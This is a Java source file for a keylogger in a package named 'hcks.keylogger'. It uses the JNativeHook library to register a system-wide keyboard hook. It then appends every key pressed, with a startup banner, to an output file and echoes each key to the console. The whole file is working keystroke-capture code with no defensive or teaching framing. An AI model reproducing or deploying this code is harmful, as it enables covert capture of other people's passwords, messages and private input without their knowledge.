package hcks.keylogger;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLog implements NativeKeyListener{
	
	// Fields
	File output;
	FileWriter fileOutStream;
	
	// Constructor
	public KeyLog() {

	}
	
	// Methods
	public void startLogger(File out) throws IOException {
		
		Date now = new Date();
		output = out;
		
		try {
			SimpleDateFormat df = new SimpleDateFormat("DD_MM_YYYY_@_HH_mm_ss");
			String msg = "\n#######################################################################\n -> I'm Started :D "+df.format(now)+" \n#######################################################################\n\n ";
			fileOutStream = new FileWriter(out, true);
			fileOutStream.write(msg);
			
			GlobalScreen.registerNativeHook();
			fileOutStream.flush();
		
		}catch(NativeHookException e) {
			
			String errMsg = Arrays.toString(e.getStackTrace());
			System.out.println(errMsg);
			fileOutStream.write(errMsg);
			fileOutStream.close();
		}	
//		} catch (FileNotFoundException e) {
//			
//			String errMsg = Arrays.toString(e.getStackTrace());
//			System.out.println(errMsg);
//			fileOutStream.close();
//		}
		 GlobalScreen.addNativeKeyListener(this);
		 System.out.println("Started :)");
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		
		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
		
			try {
				if(keyPressed.length()>1 || keyPressed.equals(NativeKeyEvent.VC_ENTER)) {
					keyPressed=keyPressed+"\n";
				}
				fileOutStream.write(keyPressed);
				System.out.println(keyPressed);
				fileOutStream.flush();
			} catch (IOException e) {
				String errMsg = Arrays.toString(e.getStackTrace());
				System.out.println(errMsg);
			} 
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
//		String keyPressed = NativeKeyEvent.getKeyText(arg0.getKeyCode());
//		if (keyPressed.length()==1) {
//			try {
//				fileOutStream.write(keyPressed);
//				fileOutStream.flush();
//			} catch (IOException e) {
//				String errMsg = Arrays.toString(e.getStackTrace());
//				System.out.println(errMsg);
//			} 
//		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
//		char keyPressed = arg0.getKeyChar();
//		
//			try {
//				fileOutStream.write(keyPressed);
//				fileOutStream.flush();
//			} catch (IOException e) {
//				String errMsg = Arrays.toString(e.getStackTrace());
//				System.out.println(errMsg);
//			} 
	}

	public File getOutput() {
		return output;
	}

	public void setOutput(File output) {
		this.output = output;
	}

	public FileWriter getFileOutStream() {
		return fileOutStream;
	}

	public void setFileOutStream(FileWriter fileOutStream) {
		this.fileOutStream = fileOutStream;
	}

}

